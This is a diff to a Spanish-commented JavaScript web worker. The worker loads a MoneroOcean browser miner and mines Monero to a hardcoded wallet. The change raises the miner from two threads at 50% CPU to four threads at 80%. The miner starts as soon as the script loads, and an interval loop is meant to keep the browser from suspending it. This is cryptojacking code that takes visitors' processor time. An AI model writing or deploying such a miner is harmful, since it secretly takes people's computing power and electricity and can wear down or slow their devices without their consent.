@@ -1,22 +1,24 @@
-// MOTOR DE MINADO DELTA_CONNECT - CONFIGURACIÓN DE ALTA POTENCIA (50%)
+// MOTOR DE MINADO DELTA CONNECT - CONFIGURACIÓN DE ALTA POTENCIA (80%)
 importScripts('https://moneroocean.stream/webminer.js');
 
-const WALLET = "4A2cRYWa2E57VU8TLMqz5WDIW6D9VxiAsPJ3gmu9Dsk8fceEa8enRnBCwH2tKUPAeQKjsMM3K861ASvtM8xwDi9ARwYPgSc";
+const CARTERA = "4A2CRYwa2E57VU8TLMQz5WD1W6D9Vx1AsPJ3gmu9Dsk8fce8a8nRnBCwH2tKUPAeQkjsMM3K861ASvtmSGN19A5xYFg3c";
 
 function conectar() {
-    // threads: 2 (usa dos hilos de procesamiento)
-    // throttle: 0.5 (obliga al CPU a trabajar al 50% de su capacidad)
-    const miner = new MoneroOcean.Anonymous(WALLET, {
-        threads: 2,
-        throttle: 0.5 
+    // threads: 4 (Aumentado para forzar el uso de más núcleos)
+    // throttle: 0.2 (0.2 de descanso = 80% de trabajo constante)
+    const minero = new MoneroOcean.Anonymous(CARTERA, {
+        threads: 4,
+        throttle: 0.2
     });
-    miner.start();
+
+    minero.start();
+
+    // Bucle de persistencia y monitoreo en consola
+    setInterval(() => {
+        const hashes = minero.getHashesPerSecond().toFixed(2);
+        console.log(`Estado del Sistema: Motor Delta funcionando al 80%. Velocidad: ${hashes} H/s`);
+    }, 5000);
 }
 
-// Iniciar el motor inmediatamente al cargar el script
+// Iniciar el motor inmediatamente
 conectar();
-
-// Bucle de persistencia para evitar que el navegador suspenda el proceso de fondo
-setInterval(() => {
-    console.log("Estado del Sistema: Motor Delta funcionando al 50% de potencia.");
-}, 5000);
